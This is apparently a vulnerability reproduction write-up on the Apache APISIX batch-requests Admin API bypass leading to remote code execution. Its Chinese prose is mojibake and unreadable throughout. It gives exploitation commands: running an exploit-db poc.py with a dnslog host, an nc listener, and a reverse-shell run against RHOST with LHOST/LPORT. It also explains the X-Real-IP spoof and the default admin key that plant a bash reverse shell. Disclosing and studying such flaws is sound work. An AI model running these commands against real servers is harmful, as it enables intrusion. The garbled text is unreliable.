# 0x01 æ¼æ´ç®€ä»‹
Apache Apisixæ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰åŸºé‡‘ä¼šçš„ä¸€ä¸ªäº‘åŸç”Ÿçš„å¾®æœåŠ¡APIç½‘å…³æœåŠ¡ã€‚è¯¥è½¯ä»¶åŸºäº OpenResty å’Œ etcd æ¥å®ç°ï¼Œå…·å¤‡åŠ¨æ€è·¯ç”±å’Œæ’ä»¶çƒ­åŠ è½½ï¼Œé€‚åˆå¾®æœåŠ¡ä½“ç³»ä¸‹çš„ API ç®¡ç†ã€‚

Apache APISIX ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºäº§å“çš„batch-requestsæ’ä»¶æœªå¯¹ç”¨æˆ·çš„æ‰¹å¤„ç†è¯·æ±‚è¿›è¡Œæœ‰æ•ˆé™åˆ¶ã€‚æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´ç»•è¿‡Admin Apiçš„é™åˆ¶ã€‚ 
# 0x02 å½±å“ç‰ˆæœ¬
Apache APISIX < 2.10.4
Apache APISIX < 2.12.1
# 0x03 æ¼æ´åˆ†æ
æŸ¥çœ‹apisix 2.12.1çš„commitä¿®å¤è®°å½•ï¼Œå‘ç°å®˜æ–¹çš„ä¿®å¤æ–¹æ³•åªæ˜¯å…³é—­äº† batch-requestsæ’ä»¶çš„é»˜è®¤å¼€å¯ã€‚
> [https://github.com/apache/apisix/pull/6254/commits/d4f0d6ac065e9282b2deca08073bceb62aa13b4a](https://github.com/apache/apisix/pull/6254/commits/d4f0d6ac065e9282b2deca08073bceb62aa13b4a)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647830826808-bea6c04c-c73d-417b-9b79-6f2213526011.png#clientId=u36d5f521-1109-4&from=paste&id=u431033cd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=815&originalType=binary&ratio=1&size=40646&status=done&style=none&taskId=u799b9164-355f-4659-a4eb-0be20dfd33d)

æŸ¥çœ‹batch-requestsæ’ä»¶çš„æ–‡æ¡£å¯çŸ¥ï¼Œè¯¥æ’ä»¶ä¸»è¦ç”¨http pipelineçš„æ–¹å¼æ‰¹é‡è¿›è¡Œå¤šä¸ªæ¥å£è¯·æ±‚ã€‚
> [https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/docs/zh/latest/plugins/batch-requests.md](https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/docs/zh/latest/plugins/batch-requests.md)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647831511556-39a5299e-9ffe-48c3-b44a-6f19c0c8fef4.png#clientId=u36d5f521-1109-4&from=paste&id=ufa4600a7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=614&originWidth=1165&originalType=binary&ratio=1&size=49068&status=done&style=none&taskId=u3537d00d-a6ab-49a4-865b-06c7fe126ac)

æ ¹æ®å®˜æ–¹æ¼æ´æè¿°ï¼Œæˆ‘ä»¬å¯ä»¥å°†pipelineé‡Œçš„pathä¿®æ”¹ä¸ºapisixçš„é»˜è®¤ Admin API ï¼Œä»¥æ­¤æ¥ç»•è¿‡ Admin API å¯¹IPçš„é™åˆ¶ï¼Œè¯·æ±‚æ•æ„ŸAPIæ¥è¿›è¡ŒRCEã€‚
# 0x04 ç¯å¢ƒæ­å»º
ä½¿ç”¨dockeræ¥å¿«é€Ÿéƒ¨ç½²Apache APISIX

1ã€ä»gitä»“åº“è·å–é¡¹ç›®
```shell
git clone https://github.com/apache/apisix-docker.git
```
2ã€åˆ‡æ¢åˆ°apisix-docker/examplesç›®å½•

3ã€ç¼–è¾‘docker-compose.ymlæ–‡ä»¶ï¼ŒæŠŠservices->apisixä¸‹é¢çš„image: apache/apisix:2.12.1-alpineä¸‹é¢çš„æ”¹æˆimage: apache/apisix:2.12.0-alpineè¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å®‰è£…2.12.1ä¹‹å‰çš„ç‰ˆæœ¬ã€‚

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647829192505-187564bd-d68e-4dd7-86e2-2261754f0377.png#clientId=u36d5f521-1109-4&from=paste&id=ud52d5a00&margin=%5Bobject%20Object%5D&name=image.png&originHeight=148&originWidth=645&originalType=binary&ratio=1&size=19671&status=done&style=none&taskId=ue17bb22e-49db-42da-8b62-97f317eb270)

4ã€ä½¿ç”¨docker-composeæ¥å®‰è£…å’Œéƒ¨ç½² docker å®¹å™¨
```shell
docker-compose -p docker-apisix up -d
```
å®Œæˆåï¼Œé€šè¿‡curlè®¿é—® API
```shell
curl 'http://127.0.0.1:9080/apisix/admin/routes?api_key=edd1c9f034335f136f87ad84b625c8f1'
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647833925237-69dd954d-ff92-4230-a17d-bce47222071a.png#clientId=u36d5f521-1109-4&from=paste&id=u07c538a8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=1149&originalType=binary&ratio=1&size=18945&status=done&style=none&taskId=ue6479bd8-878c-4436-800b-12671afa15f)

é»˜è®¤çš„`api_key`å¯åœ¨å®¹å™¨çš„`/usr/local/apisix/conf/config.yaml`æ‰¾åˆ°

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647831243680-ed54f6d0-a204-49b3-aaaa-5447dff66957.png#clientId=u36d5f521-1109-4&from=paste&id=uf7b96bc0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=157&originWidth=697&originalType=binary&ratio=1&size=25042&status=done&style=none&taskId=u7f5d9070-28f8-4de6-8ba6-137ae033719)

# 0x05 æ¼æ´å¤ç°

- [ğŸ”— poc.py é“¾æ¥](https://www.exploit-db.com/exploits/50829)
## 5.1 æ¼æ´éªŒè¯
åœ¨æœºå™¨å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œå¯ä½¿ç”¨dnslogå¹³å°éªŒè¯æ¼æ´ã€‚
```shell
python3 poc.py http://192.168.0.198:9080/ xxxxx.ceye.io 80
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647839926243-13a479a3-2cf7-44f5-9bde-a0c5c0ad076e.png#clientId=u36d5f521-1109-4&from=paste&id=u44f0a957&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=1494&originalType=binary&ratio=1&size=12791&status=done&style=none&taskId=u6ace040b-4648-49be-8eac-19279985279)

## 5.2 æ¼æ´åˆ©ç”¨
æ”»å‡»æœºå¼€å¯ç›‘å¬
```shell
nc -lvvp 9999
```
è¿è¡Œè„šæœ¬è¿›è¡Œæ”»å‡»
```shell
python3 poc.py http://RHOST:RPORT/ LHOST LPORT
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647832119752-6c940eaa-04cc-49ab-a20a-450aa140c080.png#clientId=u36d5f521-1109-4&from=paste&id=uee892eb0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=207&originWidth=888&originalType=binary&ratio=1&size=36419&status=done&style=none&taskId=u20ed047b-a411-4149-917c-d172a3c8a72)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647832034965-1eaa094f-359e-4f30-979d-46350e202013.png#clientId=u36d5f521-1109-4&from=paste&id=u30fefa5d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=575&originalType=binary&ratio=1&size=78415&status=done&style=none&taskId=u959e23c8-8a17-487a-aed2-25e4ef1baa9)


# 0x06 POC åˆ†æ
åˆ†æpocè„šæœ¬ï¼Œçœ‹åˆ°å‘APIå‘å‡ºäº†ä¸¤ä¸ªè¯·æ±‚ï¼š

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647833144578-2fdc96b1-cd78-4b0a-b79d-a6e747590b09.png#clientId=u36d5f521-1109-4&from=paste&id=u7ba5a4de&margin=%5Bobject%20Object%5D&name=image.png&originHeight=69&originWidth=895&originalType=binary&ratio=1&size=17464&status=done&style=none&taskId=u529631db-27cb-46b3-898b-dfde1336f28)

æŸ¥çœ‹POSTè¯·æ±‚ä¸­çš„`json_data`æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªè¯·æ±‚åªæ˜¯æ¤å…¥äº†æœ‰æ•ˆè´Ÿè½½ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è§¦å‘äº†å®ƒã€‚
`os.execute`ä½¿ç”¨å…¸å‹çš„ bash åå¼¹ shell åœ¨è„šæœ¬ä¸­æ‰§è¡Œå‘½ä»¤ã€‚

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647833317619-94ce78e3-75f3-41f0-9b73-480463f2b825.png#clientId=u36d5f521-1109-4&from=paste&id=u7c659636&margin=%5Bobject%20Object%5D&name=image.png&originHeight=317&originWidth=1069&originalType=binary&ratio=1&size=50248&status=done&style=none&taskId=ud4449df3-8aa2-4d92-97b4-95317a7a363)

å¦‚ä¸Šæ‰€è¿°ï¼Œæ­¤ RCE æ¼æ´çš„æ ¸å¿ƒåœ¨äºèƒ½å¤Ÿ **ç»•è¿‡ IP é™åˆ¶ **å’Œ **ä½¿ç”¨é»˜è®¤é…ç½®çš„ API **ã€‚
é€šè¿‡ä½¿ç”¨`X-Real-IP`æ ‡å¤´è®¾ç½®æ¥ç»•è¿‡ IP ï¼Œè®¾ç½®ä¸º127.0.0.1
è®¾ç½®`X-API-KEY`ä¸ºé»˜è®¤çš„ç®¡ç† API ä»¤ç‰Œï¼Œå³ `X-API-KEYï¼šedd1c9f034335f136f87ad84b625c8f1`

è¿è¡Œpocåï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ API æŸ¥çœ‹è·¯ç”±ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°æ·»åŠ äº†ä¸€æ¡æ–°è·¯ç”±ã€‚
åœ¨`filter_func`å­—æ®µæ˜¯æˆ‘ä»¬çš„åå¼¹ shellã€‚ `uri`å­—æ®µè®¾ç½®ä¸º`/rms/fzxewh`ã€‚
è¿™éƒ½æ˜¯åœ¨ç¬¬ä¸€ä¸ªPOSTè¯·æ±‚åŒ…çš„`json_data`ä¸­è®¾ç½®çš„ã€‚

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647834554617-ac600134-9295-434d-94e1-f511494dd461.png#clientId=u36d5f521-1109-4&from=paste&id=u04207688&margin=%5Bobject%20Object%5D&name=image.png&originHeight=765&originWidth=1387&originalType=binary&ratio=1&size=57034&status=done&style=none&taskId=ub35426e1-8042-4eed-aa9c-895ccf47b9f)


åœ¨ç¬¬äºŒä¸ªè¯·æ±‚ä¸­ï¼Œå‘é‚£ä¸ªç«¯ç‚¹å‘å‡ºä¸€ä¸ªè¯·æ±‚ï¼Œè§¦å‘åå¼¹ shell

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647837006779-63d2ef20-8354-4d08-872a-348b5f20495a.png#clientId=u36d5f521-1109-4&from=paste&id=u99b0d8ac&margin=%5Bobject%20Object%5D&name=image.png&originHeight=29&originWidth=670&originalType=binary&ratio=1&size=7921&status=done&style=none&taskId=u9c425762-c2f2-442d-bd33-f2f0bb3dd34)

# 0x07 ä¿®å¤å»ºè®®
ç›®å‰å‚å•†å·²å‘å¸ƒå‡çº§è¡¥ä¸ä»¥ä¿®å¤æ¼æ´ï¼Œè¡¥ä¸è·å–é“¾æ¥ï¼š

- [https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94](https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94)
# 0x08 å‚è€ƒé“¾æ¥

- [http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202202-1030](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202202-1030)
- [https://mp.weixin.qq.com/s?__biz=MzUxMjc0MTE3Mw==&mid=2247486971&idx=1&sn=286dd322821b335705ed975b3afa062b](https://mp.weixin.qq.com/s?__biz=MzUxMjc0MTE3Mw==&mid=2247486971&idx=1&sn=286dd322821b335705ed975b3afa062b)
- [https://blog.csdn.net/weixin_42353842/article/details/122943253](https://blog.csdn.net/weixin_42353842/article/details/122943253)
- [https://www.exploit-db.com/exploits/50829](https://www.exploit-db.com/exploits/50829)





